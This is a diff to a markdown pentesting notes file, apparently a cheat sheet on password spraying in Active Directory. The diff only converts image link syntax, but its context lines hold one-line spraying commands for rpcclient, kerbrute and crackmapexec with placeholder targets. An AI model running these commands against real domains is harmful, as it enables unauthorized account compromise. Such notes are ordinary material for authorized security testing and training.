@@ -2,19 +2,19 @@
 ```JavaScript
 for u in $(cat <userlist>);do rpcclient -U "$u%Welcome1" -c "getusername;quit" <IP> | grep Authority; done
 ```
-![[/image 354.png|image 354.png]]
+![image 354.png](/image%20354.png)
   
 # Kerbrute
 ```JavaScript
 kerbrute passwordspray -d <DOMAIN> --dc <IP> <userlist> <pass_to_spray>
 ```
-![[/image 1 262.png|image 1 262.png]]
+![image 1 262.png](/image%201%20262.png)
   
 # Crackmapexec
 ```JavaScript
 crackmapexec smb <IP> -u <userlist> -p <pass_to_spray> | grep +
 ```
-![[/image 2 225.png|image 2 225.png]]
+![image 2 225.png](/image%202%20225.png)
   
 # Local Administrator Password Reuse
 more common than I thought
